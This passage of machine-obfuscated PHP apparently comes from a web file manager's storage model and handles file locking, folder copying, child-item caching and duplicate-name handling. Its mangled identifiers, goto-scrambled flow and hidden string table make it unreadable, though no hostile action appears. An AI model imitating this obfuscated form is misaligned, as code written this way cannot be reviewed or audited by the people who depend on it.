lockWriteEnd($eŠ„‡†Š³, $EÅÀ¦ßŒ± = '') { $dî°‚ùôöÍ =& $_SERVER[“]; if (!$this->allowLock()) { return; } $eÒÂ¡†Ñ±Œ = 0; $this->_lockKey($dî°‚ùôöÍ[497] . $eŠ„‡†Š³ . $dî°‚ùôöÍ[91] . $EÅÀ¦ßŒ±, $eÒÂ¡†Ñ±Œ); $this->_lockEvent($eŠ„‡†Š³, array($dî°‚ùôöÍ[492], $dî°‚ùôöÍ[494]), $eÒÂ¡†Ñ±Œ); $this->_lockParent($eŠ„‡†Š³, array($dî°‚ùôöÍ[492], $dî°‚ùôöÍ[494]), $eÒÂ¡†Ñ±Œ); } public function lockMoveStart($b¯§¦ÈÑÉÂ) { goto aÇÇù…œ‚ò; C•¼™Åš»“: $this->_lockParent($b¯§¦ÈÑÉÂ, array($D†Á¶¸‡†´[492], $D†Á¶¸‡†´[494]), $Fá°ÓùíÕ); $this->_lockEvent($b¯§¦ÈÑÉÂ, array($D†Á¶¸‡†´[499], $D†Á¶¸‡†´[495], $D†Á¶¸‡†´[496]), $Fá°ÓùíÕ); $this->_lockCheckEnd($D†Á¶¸‡†´[494], $b¯§¦ÈÑÉÂ); goto BöŠ´Á÷; FĞŠ×Ğ¢œî: $Fá°ÓùíÕ = 1; $this->_lockKey($D†Á¶¸‡†´[498] . $b¯§¦ÈÑÉÂ, $Fá°ÓùíÕ); $this->_lockEvent($b¯§¦ÈÑÉÂ, array($D†Á¶¸‡†´[492], $D†Á¶¸‡†´[493]), $Fá°ÓùíÕ); goto C•¼™Åš»“; aÇÇù…œ‚ò: $D†Á¶¸‡†´ =& $_SERVER[“]; if (!$this->allowLock()) { return; } $this->_lockCheck($D†Á¶¸‡†´[494], $b¯§¦ÈÑÉÂ); goto FĞŠ×Ğ¢œî; BöŠ´Á÷: } public function lockMoveEnd($F«øŸ¯¹Œ) { goto b©›ÖôÙ; B¯Í³í¬šÊ: $this->_lockEvent($F«øŸ¯¹Œ, array($cä§æš—Æ¬[499], $cä§æš—Æ¬[495], $cä§æš—Æ¬[496]), $DÅô¯âè„); goto Dá‡œ˜™¼¡; Dˆß‰ÛÛ£‰: $this->_lockKey($cä§æš—Æ¬[498] . $F«øŸ¯¹Œ, $DÅô¯âè„); $this->_lockEvent($F«øŸ¯¹Œ, array($cä§æš—Æ¬[492], $cä§æš—Æ¬[493]), $DÅô¯âè„); $this->_lockParent($F«øŸ¯¹Œ, array($cä§æš—Æ¬[492], $cä§æš—Æ¬[494]), $DÅô¯âè„); goto B¯Í³í¬šÊ; b©›ÖôÙ: $cä§æš—Æ¬ =& $_SERVER[“]; if (!$this->allowLock()) { return; } $DÅô¯âè„ = 0; goto Dˆß‰ÛÛ£‰; Dá‡œ˜™¼¡: } private function _lockCheck($cÎùÉÁ¸¨Î, $EŠ‚İë³£°) { goto CÔé–Ï”¶; Bª§îº™¾Ì: CacheLock::setErrorMsg($F²õ÷Š½µ[157] . htmlspecialchars($B¶»Ä½³[$F²õ÷Š½µ[28]]) . $F²õ÷Š½µ[478] . $b ÉĞ–°Á); $this->_lockKey($a‹¨•¬Óª, 1); $this->_lockKey($a‹¨•¬Óª, 0); goto Bã²¥Í²µ; CÔé–Ï”¶: $F²õ÷Š½µ =& $_SERVER[“]; $B¶»Ä½³ = $this->sourceInfo($EŠ‚İë³£°); $a‹¨•¬Óª = $cÎùÉÁ¸¨Î . $F²õ÷Š½µ[91] . $EŠ‚İë³£°; goto Fó¦ÑğÈ·; Bã²¥Í²µ: $fÆÏÓëÖ” = array_reverse($this->parentLevelArray($B¶»Ä½³[$F²õ÷Š½µ[461]])); foreach ($fÆÏÓëÖ” as $fÂÕßöî‡•) { $a‹¨•¬Óª = $cÎùÉÁ¸¨Î . $F²õ÷Š½µ[501] . $fÂÕßöî‡•; if (CacheLock::lockGet($F²õ÷Š½µ[502] . $a‹¨•¬Óª)) { $B¶»Ä½³ = $this->sourceInfo($fÂÕßöî‡•); CacheLock::setErrorMsg($F²õ÷Š½µ[157] . htmlspecialchars($B¶»Ä½³[$F²õ÷Š½µ[28]]) . $F²õ÷Š½µ[478] . $b ÉĞ–°Á); $this->_lockKey($a‹¨•¬Óª, 1); $this->_lockKey($a‹¨•¬Óª, 0); } } goto BíŠØÎ¢Ø¦; Fó¦ÑğÈ·: $this->_lockTimeStart[$a‹¨•¬Óª] = timeFloat(); if (!is_array($B¶»Ä½³)) { return; } $b ÉĞ–°Á = LNG($F²õ÷Š½µ[500]); goto Bª§îº™¾Ì; BíŠØÎ¢Ø¦: } private function _lockCheckEnd($Dõæéå÷Ì³, $BÛ‰½†«º‹) { goto F®¼çºÁ‚³; b°ŠÓ¯œ˜£: if (!isset($this->_lockTimeStart[$f¶ÉÂ§ •])) { return; } $e»»‘šÀğ = timeFloat() - $this->_lockTimeStart[$f¶ÉÂ§ •]; unset($this->_lockTimeStart[$f¶ÉÂ§ •]); goto F“ñ¶ÏùÉğ; F®¼çºÁ‚³: $c‚Ğä’ŸÉ =& $_SERVER[“]; $f¶ÉÂ§ • = $Dõæéå÷Ì³ . $c‚Ğä’ŸÉ[91] . $BÛ‰½†«º‹; CacheLock::setErrorMsg($c‚Ğä’ŸÉ[361]); goto b°ŠÓ¯œ˜£; F“ñ¶ÏùÉğ: if ($e»»‘šÀğ > 0.5) { unset(self::$cacheSourceInfo[$c‚Ğä’ŸÉ[410] . $BÛ‰½†«º‹]); } $F©”×¹›¡™ = $this->sourceInfo($BÛ‰½†«º‹); if (!$F©”×¹›¡™) { show_json(LNG($c‚Ğä’ŸÉ[101]), !1); } goto fÕ«˜ô¶„¸; fÕ«˜ô¶„¸: } private function _lockParent($eƒ¡ØøÌä¼, $eà „Ù ¥¾, $cƒÖÈ¶‚è) { if (!$this->autoLockSet) { return; } $Cí‹Ó‰ª¤ˆ = $this->sourceInfo($eƒ¡ØøÌä¼); if (!is_array($Cí‹Ó‰ª¤ˆ)) { return; } $c±íŒƒ«ë = array_reverse($this->parentLevelArray($Cí‹Ó‰ª¤ˆ[$_SERVER[“][461]])); foreach ($c±íŒƒ«ë as $f„ˆâÎŠä‹) { $this->_lockEvent($f„ˆâÎŠä‹, $eà „Ù ¥¾, $cƒÖÈ¶‚è); } } private function _lockEvent($BïèÆì§, $dèä‰¸İ, $CÀ¾ÂÒ«®ƒ) { $f‰âÉ›ØƒÚ =& $_SERVER[“]; if (!$this->autoLockSet) { return; } foreach ($dèä‰¸İ as $a§Œíàâ÷) { $bŒ†÷ƒ¹­ = $a§Œíàâ÷ . $f‰âÉ›ØƒÚ[91] . $BïèÆì§; if ($CÀ¾ÂÒ«®ƒ && CacheLock::lockGet($f‰âÉ›ØƒÚ[502] . $bŒ†÷ƒ¹­)) { continue; } $this->_lockKey($bŒ†÷ƒ¹­, $CÀ¾ÂÒ«®ƒ); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($d¡È¢§åŠè, $BƒÎ¼ŸïïÂ = 1) { $D½¹ÚÊŸÊê = $_SERVER[“][502] . md5($d¡È¢§åŠè); if ($BƒÎ¼ŸïïÂ) { if (isset(self::$_lockItemArr[$D½¹ÚÊŸÊê])) { return; } self::$_lockItemArr[$D½¹ÚÊŸÊê] = 1; CacheLock::lock($D½¹ÚÊŸÊê, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$D½¹ÚÊŸÊê])) { return; } unset(self::$_lockItemArr[$D½¹ÚÊŸÊê]); CacheLock::unlock($D½¹ÚÊŸÊê); } } public function isParentOf($cÀ§ÚÏŞƒ£, $fæ¿íƒ‚”É) { goto cÕã©…¤É†; eğÇô §ÆÕ: $BÍ—²¦œ = $D˜ĞÇ¨ÆÒ­[$F¸¾ˆ±•êÈ[461]] . $D˜ĞÇ¨ÆÒ­[$F¸¾ˆ±•êÈ[369]] . $F¸¾ˆ±•êÈ[47]; $EÂ‰İÃµĞ‘ = $aàğÊÈååè[$F¸¾ˆ±•êÈ[461]] . $aàğÊÈååè[$F¸¾ˆ±•êÈ[369]] . $F¸¾ˆ±•êÈ[47]; $c½‚ôÁ¦¾È = strpos($EÂ‰İÃµĞ‘, $BÍ—²¦œ) === 0; goto aÒâ›•‹âÁ; aÒâ›•‹âÁ: return $c½‚ôÁ¦¾È; goto BÎĞ†£èÄÙ; cÕã©…¤É†: $F¸¾ˆ±•êÈ =& $_SERVER[“]; $D˜ĞÇ¨ÆÒ­ = $this->sourceInfo($cÀ§ÚÏŞƒ£); $aàğÊÈååè = $this->sourceInfo($fæ¿íƒ‚”É); goto eğÇô §ÆÕ; BÎĞ†£èÄÙ: } private $targetIsDelete = 0; public function copy($Fšß‚É°İÇ, $C®†‡½ª¥‘, $f³²ëáó… = REPEAT_REPLACE, $fÊÄŸ©¨Š = '') { goto cœ®ï“†Ò°; câ¸À¶îÃ´: $this->saveAll($C‡ÊÇ‰¡Œ[$bØà…ßÉ™†[505]]); Model($bØà…ßÉ™†[167])->linkAdd($C‡ÊÇ‰¡Œ[$bØà…ßÉ™†[503]]); $this->folderSizeReset($C®†‡½ª¥‘); goto EßğÓ°íÈÅ; C×ÑÎñâç–: $this->targetIsDelete = intval($aÛèÅÖµƒ[$bØà…ßÉ™†[397]]); $d‚‰å›†À„ = $this->fileNameExistCache($C®†‡½ª¥‘, $aÛèÅÖµƒ[$bØà…ßÉ™†[28]]); $eˆ†ÊğÕÏß = $this->_copy($Fšß‚É°İÇ, $C®†‡½ª¥‘, $f³²ëáó…, $C‡ÊÇ‰¡Œ, !0, $fÊÄŸ©¨Š); goto a·ƒ‡ƒ½Ä‰; dõè™÷Äáñ: if (!$aÛèÅÖµƒ || !$d››—¿¢Ûí || $d››—¿¢Ûí[$bØà…ßÉ™†[370]] != $bØà…ßÉ™†[83]) { return !1; } if ($this->isParentOf($Fšß‚É°İÇ, $C®†‡½ª¥‘)) { return !1; } $D¹‹ÖãöÃù = $fÊÄŸ©¨Š ? $fÊÄŸ©¨Š : $aÛèÅÖµƒ[$bØà…ßÉ™†[28]]; goto b¸‹ê²¨ÖÈ; EßğÓ°íÈÅ: $this->updateModifyTime($C®†‡½ª¥‘); return $eˆ†ÊğÕÏß; goto dì©šÁ¡–Ì; Bô¤ßåœß: if ($aÛèÅÖµƒ[$bØà…ßÉ™†[370]] == $bØà…ßÉ™†[83] && $d‚‰å›†À„ == $eˆ†ÊğÕÏß) { $this->folderSizeResetChildren($d‚‰å›†À„); } Model($bØà…ßÉ™†[506])->addAll($C‡ÊÇ‰¡Œ[$bØà…ßÉ™†[504]], array(), !0); if ($d‚‰å›†À„ != $eˆ†ÊğÕÏß || $aÛèÅÖµƒ[$bØà…ßÉ™†[370]] == $bØà…ßÉ™†[83]) { Model($bØà…ßÉ™†[507])->eventCopy($eˆ†ÊğÕÏß); } goto câ¸À¶îÃ´; a·ƒ‡ƒ½Ä‰: $this->_childrenListClear(); $this->lockCopyEnd($Fšß‚É°İÇ); $this->lockWriteEnd($C®†‡½ª¥‘, $D¹‹ÖãöÃù); goto Bô¤ßåœß; b¸‹ê²¨ÖÈ: $this->lockCopyStart($Fšß‚É°İÇ); $this->lockWriteStart($C®†‡½ª¥‘, $D¹‹ÖãöÃù); $C‡ÊÇ‰¡Œ = array($bØà…ßÉ™†[503] => array(), $bØà…ßÉ™†[504] => array(), $bØà…ßÉ™†[505] => array()); goto C×ÑÎñâç–; cœ®ï“†Ò°: $bØà…ßÉ™† =& $_SERVER[“]; $aÛèÅÖµƒ = $this->sourceInfo($Fšß‚É°İÇ); $d››—¿¢Ûí = $this->sourceInfo($C®†‡½ª¥‘); goto dõè™÷Äáñ; dì©šÁ¡–Ì: } private function _copy($eš’éµÉªÂ, $E… ÃİÆ½, $EèĞé×‡õÁ, &$Bìà°Œ‹Ä¼, $dÂ½†Ú°‘, $aĞ©±ĞÆ¦è = '') { goto dçâ¦âÙŠ; EÌœ¦ê¾ó¤: $a×Ö¾–¿° = $aĞ©±ĞÆ¦è ? $aĞ©±ĞÆ¦è : $a‚è£ôù×Å[$Fš‹É³¼¥[28]]; $d”ì†ñÏ› = $this->fileNameExistCache($E… ÃİÆ½, $a×Ö¾–¿°); if ($dÂ½†Ú°‘) { $this->_childrenAllMake($eš’éµÉªÂ); if ($fÁÃÎìÕŒµ && $d”ì†ñÏ›) { $this->_childrenAllMake($d”ì†ñÏ›); } } goto A˜ê¶›Ö»ì; eÈÃĞ¡ÑÅƒ: return $C½ñ¬ëñ; goto d”•‚ÀÉ”; dçâ¦âÙŠ: $Fš‹É³¼¥ =& $_SERVER[“]; $a‚è£ôù×Å = $this->sourceInfoCache($eš’éµÉªÂ); $fÁÃÎìÕŒµ = $a‚è£ôù×Å[$Fš‹É³¼¥[370]] == $Fš‹É³¼¥[83]; goto EÌœ¦ê¾ó¤; A˜ê¶›Ö»ì: if (!$d”ì†ñÏ›) { return $this->_copyCreate($eš’éµÉªÂ, $E… ÃİÆ½, $a×Ö¾–¿°, $Bìà°Œ‹Ä¼); } $C½ñ¬ëñ = $d”ì†ñÏ›; if ($fÁÃÎìÕŒµ) { if ($EèĞé×‡õÁ == REPEAT_RENAME_FOLDER) { $a×Ö¾–¿° = $this->fileNameAutoCache($E… ÃİÆ½, $a×Ö¾–¿°, $EèĞé×‡õÁ, $fÁÃÎìÕŒµ); $C½ñ¬ëñ = $this->_copyCreate($eš’éµÉªÂ, $E… ÃİÆ½, $a×Ö¾–¿°, $Bìà°Œ‹Ä¼); } else { $fÏ¦Óø¢õ = $this->_childrenList($eš’éµÉªÂ); foreach ($fÏ¦Óø¢õ as $fŒåªŸ÷¿¹) { $this->_copy($fŒåªŸ÷¿¹[$Fš‹É³¼¥[369]], $d”ì†ñÏ›, $EèĞé×‡õÁ, $Bìà°Œ‹Ä¼, !1); } } } else { if ($EèĞé×‡õÁ == REPEAT_RENAME || $EèĞé×‡õÁ == REPEAT_RENAME_FOLDER) { $a×Ö¾–¿° = $this->fileNameAutoCache($E… ÃİÆ½, $a×Ö¾–¿°, $EèĞé×‡õÁ, $fÁÃÎìÕŒµ); $C½ñ¬ëñ = $this->_copyCreate($eš’éµÉªÂ, $E… ÃİÆ½, $a×Ö¾–¿°, $Bìà°Œ‹Ä¼); } else { if ($EèĞé×‡õÁ == REPEAT_REPLACE) { $C„§âğ°Šï = $this->sourceInfoCache($d”ì†ñÏ›); $dÛÀ‚í²„İ = $this->fileHistory($C„§âğ°Šï, $a‚è£ôù×Å[$Fš‹É³¼¥[419]], $a‚è£ôù×Å[$Fš‹É³¼¥[77]]); if ($dÛÀ‚í²„İ) { $Bìà°Œ‹Ä¼[$Fš‹É³¼¥[503]][] = $a‚è£ôù×Å[$Fš‹É³¼¥[419]]; } } else { if ($EèĞé×‡õÁ == REPEAT_SKIP) { } } } Hook::trigger($Fš‹É³¼¥[508], array($Fš‹É³¼¥[509], $a‚è£ôù×Å, 0)); } goto eÈÃĞ¡ÑÅƒ; d”•‚ÀÉ”: } private function _copyCreate($aïˆ‹Œ§ÔŠ, $eÁ¢¦, $D¦âÈ°†à×, &$AØãê–Æ×î) { goto c·ì®ÖÍ¬; a½È¶óâœ: $B¿³¥¹Úî = $this->sourceInfo($Bèšä—»Éİ); foreach ($F–¥áèœ˜± as $dİ‘æèï”Æ) { $fİ“ªİ‰œ = $this->_makeItemData($dİ‘æèï”Æ, $B¿³¥¹Úî, $dİ‘æèï”Æ[$a£ŞÚë[28]]); $fİ“ªİ‰œ[$a£ŞÚë[461]] = $dİ‘æèï”Æ[$a£ŞÚë[461]]; $c¤ì·ö”µ°[] = $fİ“ªİ‰œ; } $this->chunkEventSet($a£ŞÚë[513], array($a£ŞÚë[514], $EÀ´†ˆ–â, $EÁÏ³åŒ’Ô)); goto c’Ş—»¾÷Ê; AŞ„ÍØ²ÄÇ: $fÃÖ”‰’[$aïˆ‹Œ§ÔŠ] = $Bèšä—»Éİ; $cñÓ‡–¦ÄÖ = array(); $f‘‹ˆ†ñƒİ = array(); goto c©ÃÕÇÙŠ«; Eøâ©Şù¨: $EÀ´†ˆ–â = $this->_makeItemData($D®ø’¬Ñƒ, $a÷š¿šğ–„, $D¦âÈ°†à×); Hook::trigger($a£ŞÚë[510], $EÀ´†ˆ–â); Hook::trigger($a£ŞÚë[511], array($a£ŞÚë[512], $EÀ´†ˆ–â, 0)); goto bÉ©Â±Œ—; c©ÃÕÇÙŠ«: foreach ($AÂÊƒ­»Â as $dİ‘æèï”Æ) { $Cõ•×É…è™ = $dİ‘æèï”Æ[$a£ŞÚë[369]]; $EöÉ‡¼³æ = $this->_childrenMatch($fÃÖ”‰’, $dİ‘æèï”Æ, $B¿³¥¹Úî); $cñÓ‡–¦ÄÖ[] = array($a£ŞÚë[369], $Cõ•×É…è™, $a£ŞÚë[463], $EöÉ‡¼³æ[$a£ŞÚë[463]]); $f‘‹ˆ†ñƒİ[] = array($a£ŞÚë[369], $Cõ•×É…è™, $a£ŞÚë[461], $EöÉ‡¼³æ[$a£ŞÚë[461]]); $this->_copyApplyMeta($dİ‘æèï”Æ, $AØãê–Æ×î); if ($dİ‘æèï”Æ[$a£ŞÚë[370]] != $a£ŞÚë[83]) { $AØãê–Æ×î[$a£ŞÚë[503]][] = $dİ‘æèï”Æ[$a£ŞÚë[419]]; } } $this->chunkEventSet($a£ŞÚë[515], array($a£ŞÚë[516], $EÀ´†ˆ–â, $EÁÏ³åŒ’Ô)); $this->saveAll($cñÓ‡–¦ÄÖ); goto CÓé»Óæ÷Ö; DŒ¾Ş§Ù¶“: if ($D®ø’¬Ñƒ[$a£ŞÚë[370]] != $a£ŞÚë[83]) { $AØãê–Æ×î[$a£ŞÚë[503]][] = $D®ø’¬Ñƒ[$a£ŞÚë[419]]; return $Bèšä—»Éİ; } $F–¥áèœ˜± = array(); $c¤ì·ö”µ° = array(); goto E¦µë±Á©Û; E¦µë±Á©Û: $this->_childrenListAll($aïˆ‹Œ§ÔŠ, $F–¥áèœ˜±); $EÁÏ³åŒ’Ô = count($F–¥áèœ˜±); if ($EÁÏ³åŒ’Ô == 0) { return $Bèšä—»Éİ; } goto a½È¶óâœ; c·ì®ÖÍ¬: $a£ŞÚë =& $_SERVER[“]; $D®ø’¬Ñƒ = $this->sourceInfoCache($aïˆ‹Œ§ÔŠ); $a÷š¿šğ–„ = $this->sourceInfoCache($eÁ¢¦); goto Eøâ©Şù¨; c’Ş—»¾÷Ê: $this->addAll($c¤ì·ö”µ°, array(), !1); $AÂÊƒ­»Â = $this->where(array($a£ŞÚë[463] => $Bèšä—»Éİ))->select(); $fÃÖ”‰’ = $this->_childrenMakeRelation($F–¥áèœ˜±, $AÂÊƒ­»Â); goto AŞ„ÍØ²ÄÇ; bÉ©Â±Œ—: $Bèšä—»Éİ = $this->add($EÀ´†ˆ–â); $F×ëÂ˜ºÅ” = array($a£ŞÚë[369] => $Bèšä—»Éİ, $a£ŞÚë[28] => $D¦âÈ°†à×); $this->_copyApplyMeta($F×ëÂ˜ºÅ”, $AØãê–Æ×î); goto DŒ¾Ş§Ù¶“; CÓé»Óæ÷Ö: $this->chunkEventSet($a£ŞÚë[517], array($a£ŞÚë[518], $EÀ´†ˆ–â, $EÁÏ³åŒ’Ô)); $this->saveAll($f‘‹ˆ†ñƒİ); return $Bèšä—»Éİ; goto EŒµ‹Ö‘Ë¶; EŒµ‹Ö‘Ë¶: } private function _childrenMakeRelation($b…ÙâÒÉ‹Ò, $e¬Ó‘¾†Ú¤) { $a›„Ú°é´Ï =& $_SERVER[“]; $fö÷æÍÚî‹ = array(); $eË¢¥˜‚Â¶ = array(); foreach ($b…ÙâÒÉ‹Ò as $d¸²¢Š‹®ä) { $aâ•ÂÆêàˆ = $d¸²¢Š‹®ä[$a›„Ú°é´Ï[28]] . $a›„Ú°é´Ï[8] . $d¸²¢Š‹®ä[$a›„Ú°é´Ï[461]]; $fö÷æÍÚî‹[$aâ•ÂÆêàˆ] = $d¸²¢Š‹®ä[$a›„Ú°é´Ï[369]]; } foreach ($e¬Ó‘¾†Ú¤ as $d¸²¢Š‹®ä) { $aâ•ÂÆêàˆ = $d¸²¢Š‹®ä[$a›„Ú°é´Ï[28]] . $a›„Ú°é´Ï[8] . $d¸²¢Š‹®ä[$a›„Ú°é´Ï[461]]; $d×áø”µë„ = $fö÷æÍÚî‹[$aâ•ÂÆêàˆ]; $eË¢¥˜‚Â¶[$d×áø”µë„] = $d¸²¢Š‹®ä[$a›„Ú°é´Ï[369]]; } return $eË¢¥˜‚Â¶; } private function _childrenMatch($A¡é–‚‹‘¸, $d¯ÓéŠÕãæ, $fØ¢¨Èˆ×‘) { goto cŠíİÖùé; cÕï‚Ğ¯Åä: $D½à«ƒËÚâ = $AºŸËöÔ—´[count($AºŸËöÔ—´) - 1]; return array($eãĞ†Ã´™Í[463] => $D½à«ƒËÚâ, $eãĞ†Ã´™Í[461] => $EÊåùºíÀ®); goto FØõÎö–ß; cŠíİÖùé: $eãĞ†Ã´™Í =& $_SERVER[“]; $EÊåùºíÀ® = $fØ¢¨Èˆ×‘[$eãĞ†Ã´™Í[461]]; $fİ¿ÖÏ£à³ = $this->parentLevelArray($d¯ÓéŠÕãæ[$eãĞ†Ã´™Í[461]]); goto cˆÜÇàÜ§; cˆÜÇàÜ§: foreach ($fİ¿ÖÏ£à³ as $cèÁ¯—¸º) { if (isset($A¡é–‚‹‘¸[$cèÁ¯—¸º])) { $EÊåùºíÀ® .= $A¡é–‚‹‘¸[$cèÁ¯—¸º] . $eãĞ†Ã´™Í[519]; } } $EÊåùºíÀ® = rtrim($EÊåùºíÀ®, $eãĞ†Ã´™Í[47]) . $eãĞ†Ã´™Í[47]; $AºŸËöÔ—´ = $this->parentLevelArray($EÊåùºíÀ®); goto cÕï‚Ğ¯Åä; FØõÎö–ß: } private function _makeItemData($E¡…„£¬º, $cßÔêºËš, $EÆˆÔŸ›İî) { $bêäœ­ÑÅ =& $_SERVER[“]; $CØÇ´é…ÒË = array($bêäœ­ÑÅ[520] => $E¡…„£¬º[$bêäœ­ÑÅ[370]], $bêäœ­ÑÅ[386] => $EÆˆÔŸ›İî, $bêäœ­ÑÅ[521] => $E¡…„£¬º[$bêäœ­ÑÅ[372]], $bêäœ­ÑÅ[420] => $E¡…„£¬º[$bêäœ­ÑÅ[419]], $bêäœ­ÑÅ[522] => $E¡…„£¬º[$bêäœ­ÑÅ[77]], $bêäœ­ÑÅ[523] => $cßÔêºËš[$bêäœ­ÑÅ[371]], $bêäœ­ÑÅ[524] => $cßÔêºËš[$bêäœ­ÑÅ[458]], $bêäœ­ÑÅ[525] => USER_ID, $bêäœ­ÑÅ[526] => USER_ID, $bêäœ­ÑÅ[368] => $cßÔêºËš[$bêäœ­ÑÅ[369]], $bêäœ­ÑÅ[527] => $cßÔêºËš[$bêäœ­ÑÅ[461]] . $cßÔêºËš[$bêäœ­ÑÅ[369]] . $bêäœ­ÑÅ[47], $bêäœ­ÑÅ[396] => 0, $bêäœ­ÑÅ[528] => $bêäœ­ÑÅ[33]); return $CØÇ´é…ÒË; } private function _copyApplyMeta($F††ç‡Ì†Ú, &$e¶Õµ„­öé) { $D§Á‡·âÚÃ =& $_SERVER[“]; $D»Ÿä·İŞ = $F††ç‡Ì†Ú[$D§Á‡·âÚÃ[369]]; $A•¤Ÿ¢²– = $F††ç‡Ì†Ú[$D§Á‡·âÚÃ[28]]; if (!isset($F††ç‡Ì†Ú[$D§Á‡·âÚÃ[529]]) || !$F††ç‡Ì†Ú[$D§Á‡·âÚÃ[529]] || $F††ç‡Ì†Ú[$D§Á‡·âÚÃ[529]] == $D§Á‡·âÚÃ[470]) { $e¶Õµ„­öé[$D§Á‡·âÚÃ[505]][] = array($D§Á‡·âÚÃ[369], $D»Ÿä·İŞ, $D§Á‡·âÚÃ[529], short_id($D»Ÿä·İŞ)); } if (Input::check($A•¤Ÿ¢²–, $D§Á‡·âÚÃ[530])) { $e¶Õµ„­öé[$D§Á‡·âÚÃ[504]][] = array($D§Á‡·âÚÃ[369] => $D»Ÿä·İŞ, $D§Á‡·âÚÃ[89] => $D§Á‡·âÚÃ[416], $D§Á‡·âÚÃ[359] => str_replace($D§Á‡·âÚÃ[50], $D§Á‡·âÚÃ[33], Pinyin::encode($A•¤Ÿ¢²–))); $e¶Õµ„­öé[$D§Á‡·âÚÃ[504]][] = array($D§Á‡·âÚÃ[369] => $D»Ÿä·İŞ, $D§Á‡·âÚÃ[89] => $D§Á‡·âÚÃ[415], $D§Á‡·âÚÃ[359] => Pinyin::encode($A•¤Ÿ¢²–, $D§Á‡·âÚÃ[531])); } } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($b˜ªˆ­¸£–) { goto EŠƒ¹í‹; EŠƒ¹í‹: $D´ÔÃ¢›Û’ =& $_SERVER[“]; $F«˜Ä½Ùä = $this->sourceInfo($b˜ªˆ­¸£–); $Bù¾ÌÂêÛÙ = $D´ÔÃ¢›Û’[532]; goto aÏŸÛĞ äÍ; DÆœœÏìˆ: $f–†Õ¨Ç¢ = array_to_keyvalue($f–†Õ¨Ç¢, $D´ÔÃ¢›Û’[369]); foreach ($f–†Õ¨Ç¢ as $BŠ²œ¥‡×) { $b´Æ”ˆ×¸˜ = $BŠ²œ¥‡×[$D´ÔÃ¢›Û’[463]]; $b˜ªˆ­¸£– = $BŠ²œ¥‡×[$D´ÔÃ¢›Û’[369]]; if (!isset($this->_childrenListCache[$b˜ªˆ­¸£–]) && $BŠ²œ¥‡×[$D´ÔÃ¢›Û’[370]] == $D´ÔÃ¢›Û’[83]) { $this->_childrenListCache[$b˜ªˆ­¸£–] = array(); } if (!isset($this->_childrenListCache[$b´Æ”ˆ×¸˜])) { $this->_childrenListCache[$b´Æ”ˆ×¸˜] = array(); } $this->_childrenListCache[$b´Æ”ˆ×¸˜][$b˜ªˆ­¸£–] = $BŠ²œ¥‡×; $this->_childrenItemCache[$b˜ªˆ­¸£–] = $BŠ²œ¥‡×; } goto A×‘ÎÀâ; aÏŸÛĞ äÍ: $F¼ÂÏÅ„ˆé = array($D´ÔÃ¢›Û’[461] => array($D´ÔÃ¢›Û’[485], $F«˜Ä½Ùä[$D´ÔÃ¢›Û’[461]] . $b˜ªˆ­¸£– . $D´ÔÃ¢›Û’[486]), $D´ÔÃ¢›Û’[397] => $this->targetIsDelete); $f–†Õ¨Ç¢ = $this->field($Bù¾ÌÂêÛÙ)->where($F¼ÂÏÅ„ˆé)->select(); if (!$f–†Õ¨Ç¢) { return; } goto DÆœœÏìˆ; A×‘ÎÀâ: } private function _childrenListAll($E¥Ë‚«–³, &$d—§¾ùÚÕ¹) { $D¶ÉÃŠ˜ÏÕ =& $_SERVER[“]; if (!isset($this->_childrenListCache[$E¥Ë‚«–³])) { return; } $Bê¢°’º¼½ = $this->_childrenListCache[$E¥Ë‚«–³]; foreach ($Bê¢°’º¼½ as $E„ÕçºàĞó => $a¯Œç•æŸ·) { $d—§¾ùÚÕ¹[$E„ÕçºàĞó] = $a¯Œç•æŸ·; if ($a¯Œç•æŸ·[$D¶ÉÃŠ˜ÏÕ[370]] == $D¶ÉÃŠ˜ÏÕ[83]) { $this->_childrenListAll($E„ÕçºàĞó, $d—§¾ùÚÕ¹); } } } private function sourceInfoCache($FãàìÑ°˜) { if (isset($this->_childrenItemCache[$FãàìÑ°˜])) { return $this->_childrenItemCache[$FãàìÑ°˜]; } return $this->sourceInfo($FãàìÑ°˜); } private function _childrenList($F‰©¢Õ×õ) { if (isset($this->_childrenListCache[$F‰©¢Õ×õ])) { return $this->_childrenListCache[$F‰©¢Õ×õ]; } return $this->_childrenListSelect($F‰©¢Õ×õ); } private function _childrenListSelect($a›Ã³ğÂ³£) { goto A«‡Á¯; F®§Ÿ•â¢½: foreach ($e¨»ñëïª« as $a›Ã³ğÂ³£ => $D·ƒ‚´Õ¨•) { $this->_childrenItemCache[$a›Ã³ğÂ³£] = $D·ƒ‚´Õ¨•; } return $e¨»ñëïª«; goto A¹ªÉ°çÔ¤; A«‡Á¯: $FÉºĞïùœ¼ =& $_SERVER[“]; $b÷†²‡™Áƒ = array($FÉºĞïùœ¼[463] => $a›Ã³ğÂ³£, $FÉºĞïùœ¼[397] => $this->targetIsDelete); $Eğ´Âˆ²ª = $this->where($b÷†²‡™Áƒ)->select(); goto BÛÚ’ÅçÉ‹; BÛÚ’ÅçÉ‹: $Eğ´Âˆ²ª = $Eğ´Âˆ²ª ? $Eğ´Âˆ²ª : array(); $e¨»ñëïª« = array_to_keyvalue($Eğ´Âˆ²ª, $FÉºĞïùœ¼[369]); $this->_childrenListCache[$a›Ã³ğÂ³£] = $e¨»ñëïª«; goto F®§Ÿ•â¢½; A¹ªÉ°çÔ¤: } private function fileNameExistCache($dŒÙ›¡²‚, $Cİ¿îœâŞİ) { $Eœ‡šøÍÃ§ =& $_SERVER[“]; $Cİ¿îœâŞİ = strtolower($Cİ¿îœâŞİ); $Aåšƒõ÷ĞÛ = $this->_childrenList($dŒÙ›¡²‚); foreach ($Aåšƒõ÷ĞÛ as $EŞ¨‰ôÈŒ“) { if ($Cİ¿îœâŞİ == strtolower($EŞ¨‰ôÈŒ“[$Eœ‡šøÍÃ§[28]])) { return $EŞ¨‰ôÈŒ“[$Eœ‡šøÍÃ§[369]]; } } return !1; } private function fileNameAutoCache($A—õÁ´¹¼›, $A·¦¬àÓ®¨, $DÒ‚Ø‹’¨Ÿ, $b·ªäÃÔŒÂ) { $CİÊöÍÛĞ“ =& $_SERVER[“]; $BÒƒ¢î¹ÆÅ = $this->_childrenList($A—õÁ´¹¼›); $añÌºÖ¤ = array_to_keyvalue($BÒƒ¢î¹ÆÅ, $CİÊöÍÛĞ“[33], $CİÊöÍÛĞ“[28]); return $this->fileNameAutoGet($añÌºÖ¤, 